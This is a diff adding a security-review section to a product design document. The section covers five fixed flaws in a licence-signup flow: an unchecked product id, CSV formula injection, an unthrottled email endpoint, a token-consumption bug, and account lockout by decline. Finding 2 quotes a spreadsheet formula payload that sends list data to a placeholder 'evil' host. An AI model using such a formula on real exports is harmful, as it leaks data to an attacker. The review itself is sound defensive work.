@@ -276,6 +276,39 @@ list nobody may lawfully mail — and the licence-decision email carries it in t
 the one message every signup is guaranteed to receive. An unsubscribe removes the address from the
 mailing list and touches nothing else: the licence on the cloud account stands.
 
+**Security review of the licence flow (2026-09-03) — five findings, all fixed.** The signup
+endpoint is public, unauthenticated and CORS-open, and what it stores is what an approval turns
+into an entitlement, so it was reviewed as an attack surface rather than as a form.
+
+1. **Any product could be requested.** `poppyId`/`productId` were free text, so a stranger could
+   queue a request naming *another poppy's paid product* and rely on it reading as an ordinary
+   small company in the review queue — the only thing marking it wrong was a product id in 12px
+   grey. Now an allowlist (`GRANTABLE_PRODUCTS`), enforced at submit **and** re-checked at the
+   grant, because that is the line where a record becomes an entitlement.
+2. **The lead CSV was a formula-injection channel.** Company name is typed by a stranger and the
+   export is opened in a spreadsheet, where a cell beginning `=`, `+`, `-` or `@` is executed —
+   `=HYPERLINK("http://evil/"&A1,…)` exfiltrates the list to whoever submitted it. Cells are
+   neutralised before quoting.
+3. **Nothing throttled an endpoint that emails a caller-chosen address.** That is a spam cannon
+   aimed at strangers and at our own sending reputation. Three confirmation emails per address
+   and per cloud account per hour, counted in Firestore against a hashed key — these rows record
+   attempts by addresses that never confirmed, which are exactly the ones we promise not to keep.
+4. **"Consume the token" did not consume anything.** The db runs with
+   `ignoreUndefinedProperties`, so setting `verifyTokenHash: undefined` under `{merge:true}`
+   dropped the field *from the write* instead of removing it from the document — the code did not
+   do what its comment said, and a superseded decline also left its `decidedAt`/`note` attached to
+   whatever request replaced it, possibly a different applicant's. Licence-request writes are now
+   a full replace.
+5. **A declined request locked an account id forever.** Account ids are guessable, so one junk
+   request declined would stop the real owner from ever registering. A decline now blocks only a
+   re-submit from the *same* address; a different one may apply, and the queue shows
+   `priorDeclinedAt` so the founder sees the history rather than losing it.
+
+Accepted, not fixed: `/api/entitlement?target=` tells anyone holding a cloud account id whether
+that account is licensed. It is the pre-existing cross-install gate MailPoppy's domain unlock also
+uses, it returns one boolean and no account or payment detail, and the alternative is signing a
+lookup the poppy must make before it has anything to sign with.
+
 **The first row is the enterprise's evaluation path, and it must be NAMED that way
 (founder review, 2026-09-03).** The ladder was first written with "Personal use /
 evaluation" on top; a prospect of 200 people reading that concludes either "this is not
